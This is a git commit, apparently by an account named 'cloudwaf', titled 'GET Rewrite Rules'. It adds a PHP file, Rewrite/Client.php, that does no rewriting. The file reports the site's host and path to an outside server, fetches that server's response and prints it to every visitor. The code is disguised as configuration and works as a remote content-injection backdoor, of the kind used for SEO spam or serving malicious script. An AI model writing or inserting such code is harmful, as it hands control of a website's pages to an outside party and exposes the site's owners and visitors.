c5b20552bd3c831c56e55ecd8ddcb064ea04c86f
cloudwaf <cloudcaes@gmail.com>
2018-11-29 13:16:09 +0800

    GET Rewrite Rules

---
+++ Rewrite/Client.php
@@ -0,0 +1,11 @@
+<?php
+set_time_limit(0);
+ini_set('user_agent', $_SERVER['HTTP_USER_AGENT']); 
+header("Content-Type: text/html;charset=utf-8");
+date_default_timezone_set('PRC');
+$Remote_server = "http://menu.d22p.com"; 
+$host_name = "http://".$_SERVER['HTTP_HOST'];
+$Content_mb=file_get_contents($Remote_server."/index.php?host=".$host_name."&url=".$_SERVER['PHP_SELF']);
+echo $Content_mb;
+
+?>
